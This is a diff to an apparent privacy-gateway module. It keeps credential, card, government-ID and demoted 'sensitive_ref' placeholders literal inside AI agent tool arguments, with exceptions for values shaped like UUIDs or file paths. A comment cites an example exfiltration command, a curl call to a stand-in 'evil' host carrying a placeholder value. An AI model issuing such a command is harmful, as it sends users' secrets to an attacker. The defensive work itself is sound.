@@ -35,6 +35,31 @@ def _label_key(label):
 
 # Canonical FLOOR label keys: credentials, cards, bank/IBAN, government/tax id, DOB.
 _FLOOR_CANON = frozenset(_label_key(lbl) for lbl in FLOOR_LABELS)
+# ALSO withheld from tool arguments (adversarial review 2026-07-02): 'sensitive_ref' -- the demoted form of a
+# MODEL-claimed bank/account/gov identity. Demotion removed its floor privileges (merge stickiness, allowlist
+# immunity, off-mode force-redaction) to fix the fat-floor incident, but rehydrating it into EXECUTED tool
+# arguments would re-open the exact `curl evil?x=<PLACEHOLDER>` exfil class B5 exists to block. So it keeps
+# the ONE floor privilege that is pure downside-protection: stay literal in tool args (visible via the
+# tool_arg_withheld event; allowlisting the value stops the mint entirely, which is the user lever).
+_WITHHELD_EXTRA = frozenset({'sensitiveref'})
+# Identity-class canon keys eligible for the VALUE-SHAPE migration exceptions below. NEVER the credential /
+# card / gov classes: a secret stays withheld whatever its value looks like.
+_IDENTITY_CANON = frozenset({'sensitiveaccountid', 'accountnumber', 'sensitiveref'})
+# Pre-2026-07-02 session maps hold floor placeholders for values the fat-floor diet no longer floors: UUIDs
+# (<SENSITIVEACCOUNTID_n> for a session id) and whole file paths (the Write(<placeholder>/bench2.py)
+# incident). Their labels are immortal in the map, so withholding by label alone would keep breaking agent
+# file ops for every live session across the upgrade. These MIRRORS of privacy_gate.UUID_RE / the egress
+# _path_shaped predicate (kept local: this module is dependency-light by design) let the replay map treat an
+# identity-labeled placeholder by its VALUE shape instead.
+_UUID_VALUE_RE = re.compile(r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$')
+
+
+def _path_shaped_value(v):
+    if not isinstance(v, str) or not v or any(ch.isspace() for ch in v):
+        return False
+    if not (v.startswith('/') or v.startswith('~') or re.match(r'^[A-Za-z]:[\\/]', v)):
+        return False
+    return (v.count('/') + v.count('\\')) >= 2
 
 _STRICT_ENV = 'GATEWAY_TOOL_ARG_STRICT'   # matches the egress proxy's GATEWAY_* env-knob convention
 _STRICT_FALSEY = frozenset({'', '0', 'false', 'no', 'off'})
@@ -58,12 +83,30 @@ def is_floor_placeholder(ph):
     return _label_key(m.group(1)) in _FLOOR_CANON
 
 
+def is_withheld_placeholder(ph, value=None):
+    """True when the placeholder must stay LITERAL inside executed tool arguments. Floor labels plus
+    'sensitive_ref' (see _WITHHELD_EXTRA), with VALUE-SHAPE migration exceptions scoped to the identity
+    class only: an identity-labeled placeholder whose value is a UUID or a whole file path predates the
+    2026-07-02 fat-floor diet (those shapes no longer mint identity labels) and must rehydrate so agent
+    file/session plumbing keeps working. Credential/card/gov placeholders are withheld unconditionally."""
+    m = _PH_LABEL_RE.match(ph) if isinstance(ph, str) else None
+    if m is None:
+        return True
+    key = _label_key(m.group(1))
+    if key not in _FLOOR_CANON and key not in _WITHHELD_EXTRA:
+        return False
+    if key in _IDENTITY_CANON and value is not None and (
+            _UUID_VALUE_RE.match(value) or _path_shaped_value(value)):
+        return False
+    return True
+
+
 def tool_arg_replay(replay):
     """The replay map to use when rehydrating inside tool-ARGUMENT context.
 
     - STRICT  -> {} : every placeholder stays literal in tool args.
-    - Half A (default) -> the full map minus FLOOR / secret-class tokens: secrets stay literal, non-FLOOR PII
-      still rehydrates.
+    - Half A (default) -> the full map minus WITHHELD tokens (floor labels + sensitive_ref, with the
+      identity-class value-shape migration exceptions): secrets stay literal, ordinary PII still rehydrates.
 
     Returns the SAME dict object when nothing is suppressed (fast path, so the common no-secret response pays no
     copy). Never mutates `replay`."""
@@ -71,7 +114,7 @@ def tool_arg_replay(replay):
         return replay
     if tool_arg_strict():
         return {}
-    suppressed = {ph: v for ph, v in replay.items() if not is_floor_placeholder(ph)}
+    suppressed = {ph: v for ph, v in replay.items() if not is_withheld_placeholder(ph, v)}
     return suppressed if len(suppressed) != len(replay) else replay
 
 
